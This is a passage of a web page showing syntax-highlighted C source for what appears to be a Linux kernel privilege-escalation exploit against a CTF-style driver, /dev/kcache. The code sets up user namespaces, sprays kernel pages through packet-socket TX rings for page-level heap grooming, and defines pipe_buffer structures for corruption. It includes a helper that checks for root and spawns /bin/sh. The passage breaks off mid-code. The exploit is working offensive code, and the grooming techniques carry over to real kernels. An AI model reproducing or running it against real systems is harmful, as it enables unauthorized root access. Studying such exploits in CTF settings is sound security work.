class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br><span class="line">1311</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * I - fundamental functions</span><br><span class="hljs-comment"> * e.g. CPU-core binder, user-status saver, etc.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> page_offset_base = <span class="hljs-number">0xffff888000000000</span>, vmemmap_base = <span class="hljs-number">0xffffea0000000000</span>;<br><span class="hljs-type">size_t</span> init_task, init_nsproxy, init_cred;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">direct_map_addr_to_page_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> direct_map_addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> page_count;<br><br>    page_count = ((direct_map_addr &amp; (~<span class="hljs-number">0xfff</span>)) - page_offset_base) / <span class="hljs-number">0x1000</span>;<br>    <br>    <span class="hljs-keyword">return</span> vmemmap_base + page_count * <span class="hljs-number">0x40</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* root checker and shell poper */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-comment">/* userspace status saver */</span><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* bind the process to specific core */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief create an isolate namespace</span><br><span class="hljs-comment"> * note that the caller **SHOULD NOT** be used to get the root, but an operator</span><br><span class="hljs-comment"> * to perform basic exploiting operations in it only</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">unshare_setup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> edit[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> tmp_fd;<br><br>    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    write(tmp_fd, <span class="hljs-string">&quot;deny&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;deny&quot;</span>));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getuid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getgid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span>;</span><br><br><span class="hljs-comment">/* read start from len to offset, write start from offset */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span><br><span class="hljs-comment"> * and that the contents are good. If the pages in the pipe belong</span><br><span class="hljs-comment"> * to a file system, we may need to wait for IO completion in this</span><br><span class="hljs-comment"> * hook. Returns 0 for good, or a negative error value in case of</span><br><span class="hljs-comment"> * error.  If not present all pages are considered good.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*confirm)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When the contents of this pipe buffer has been completely</span><br><span class="hljs-comment"> * consumed by a reader, -&gt;release() is called.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to take ownership of the pipe buffer and its contents.</span><br><span class="hljs-comment"> * -&gt;try_steal() returns %true for success, in which case the contents</span><br><span class="hljs-comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span><br><span class="hljs-comment"> * caller. The page may then be transferred to a different mapping, the</span><br><span class="hljs-comment"> * most often used case is insertion into different file address space</span><br><span class="hljs-comment"> * cache.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*try_steal)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Get a reference to the pipe buffer.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*get)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * II - interface to interact with /dev/kcache</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_SIZE 2048</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_NUM 0x10</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_ALLOC 0x114</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_APPEND 0x514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_READ 0x1919</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_FREE 0x810</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> &#123;</span><br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sz;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>        .sz = size,<br>        .buf = buf,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_ALLOC, &amp;cmd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_append</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>        .sz = size,<br>        .buf = buf,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_APPEND, &amp;cmd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_read</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>        .sz = size,<br>        .buf = buf,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_READ, &amp;cmd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_free</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_FREE, &amp;cmd);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * III -  pgv pages sprayer related </span><br><span class="hljs-comment"> * not that we should create two process:</span><br><span class="hljs-comment"> * - the parent is the one to send cmd and get root</span><br><span class="hljs-comment"> * - the child creates an isolate userspace by calling unshare_setup(),</span><br><span class="hljs-comment"> *      receiving cmd from parent and operates it only</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_PAGE_NUM 1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_VERSION 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_TX_RING 13</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_nr;<br>&#125;;<br><br><span class="hljs-comment">/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> &#123;</span><br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-type">int</span> cmd;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr;<br>&#125;;<br><br><span class="hljs-comment">/* operations type */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    CMD_ALLOC_PAGE,<br>    CMD_FREE_PAGE,<br>    CMD_EXIT,<br>&#125;;<br><br><span class="hljs-comment">/* tpacket version for setsockopt */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">tpacket_versions</span> &#123;</span><br>    TPACKET_V1,<br>    TPACKET_V2,<br>    TPACKET_V3,<br>&#125;;<br><br><span class="hljs-comment">/* pipe for cmd communication */</span><br><span class="hljs-type">int</span> cmd_pipe_req[<span class="hljs-number">2</span>], cmd_pipe_reply[<span class="hljs-number">2</span>];<br><br><span class="hljs-comment">/* create a socket and alloc pages, return the socket fd */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_socket_and_alloc_pages</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd, version;<br>    <span class="hljs-type">int</span> ret;<br><br>    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);<br>    <span class="hljs-keyword">if</span> (socket_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);<br>        ret = socket_fd;<br>        <span class="hljs-keyword">goto</span> err_out;<br>    &#125;<br><br>    version = TPACKET_V1;<br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, <br>                     &amp;version, <span class="hljs-keyword">sizeof</span>(version));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>    req.tp_block_size = size;<br>    req.tp_block_nr = nr;<br>    req.tp_frame_size = <span class="hljs-number">0x1000</span>;<br>    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> socket_fd;<br><br>err_setsockopt:<br>    close(socket_fd);<br>err_out:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* the parent process should call it to send command of allocation to child */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_page</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = CMD_ALLOC_PAGE,<br>        .size = size,<br>        .nr = nr,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv_page_request));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* the parent process should call it to send command of freeing to child */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">free_page</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = CMD_FREE_PAGE,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    usleep(<span class="hljs-number">10000</span>);<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* the child, handler for commands from the pipe */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">spray_cmd_handler</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd[PGV_PAGE_NUM];<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-comment">/* create an isolate namespace*/</span><br>    unshare_setup();<br><br>    <span class="hljs-comment">/* handler request */</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        read(cmd_pipe_req[<span class="hljs-number">0</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br><br>        <span class="hljs-keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;<br>            ret = create_socket_and_alloc_pages(req.size, req.nr);<br>            socket_fd[req.idx] = ret;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;<br>            ret = close(socket_fd[req.idx]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);<br>        &#125;<br><br>        write(cmd_pipe_reply[<span class="hljs-number">1</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br>    &#125; <span class="hljs-keyword">while</span> (req.cmd != CMD_EXIT);<br>&#125;<br><br><span class="hljs-comment">/* init pgv-exploit subsystem :) */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare_pgv_system</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* pipe for pgv */</span><br>    pipe(cmd_pipe_req);<br>    pipe(cmd_pipe_reply);<br>    <br>    <span class="hljs-comment">/* child process for pages spray */</span><br>    <span class="hljs-keyword">if</span> (!fork()) &#123;<br>        spray_cmd_handler();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * IV - config for page-level heap spray and heap fengshui</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NUM 200</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_1PAGE_SPRAY_NUM 0x20</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_4PAGES_SPRAY_NUM 0x40</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_8PAGES_SPRAY_NUM 0x40</span><br><br><span class="hljs-type">int</span> pgv_1page_start_idx = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> pgv_4pages_start_idx = PGV_4PAGES_START_IDX;<br><span class="hljs-type">int</span> pgv_8pages_start_idx = PGV_8PAGES_START_IDX;<br><br><span class="hljs-comment">/* spray pages in different size for various usages */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare_pgv_pages</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * We want a more clear and continuous memory there, which require us to </span><br><span class="hljs-comment">     * make the noise less in allocating order-3 pages.</span><br><span class="hljs-comment">     * So we pre-allocate the pages for those noisy objects there.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pgv order-0 pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (alloc_page(i, <span class="hljs-number">0x1000</span>, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pgv order-2 pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* spray 8 pages for page-level heap fengshui */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pgv order-3 pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-comment">/* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">19</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_4pages_start_idx++);<br>        &#125;<br><br>        <span class="hljs-comment">/* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">21</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_1page_start_idx += <span class="hljs-number">2</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">512</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_1page_start_idx += <span class="hljs-number">2</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span 